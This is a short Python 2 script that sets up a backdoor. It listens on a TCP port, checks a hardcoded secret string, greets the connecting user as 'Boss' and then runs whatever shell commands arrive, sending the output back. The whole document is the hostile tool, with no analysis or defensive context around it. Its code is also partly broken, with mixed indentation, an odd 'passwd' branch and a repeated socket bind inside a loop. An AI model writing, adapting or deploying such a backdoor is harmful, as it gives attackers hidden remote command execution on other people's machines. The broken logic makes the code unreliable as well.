#!/usr/bin/python

import subprocess,socket,sys,os
host = "127.0.0.1"
port = 1338
secret = "<!@#n<>!@$b"
while True:
                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.bind((host,port))
                sock.listen(100)
                Data = 1
                while Data == 1:
                       client,address=sock.accept()
                       DD = str(client.recv(1024)).strip("\n")
                       if DD == secret:
                        client.send('[+] Hi Boss :D\n')
                        while True:
		  	        data=client.recv(1024).strip("\n")
                                if data == "passwd":
                                  print "Ok , passwd executed !"
                                else:
                                 data=client.recv(1024)

                                for line in os.popen(data):
                                   client.send(line)
                       else:
                         None

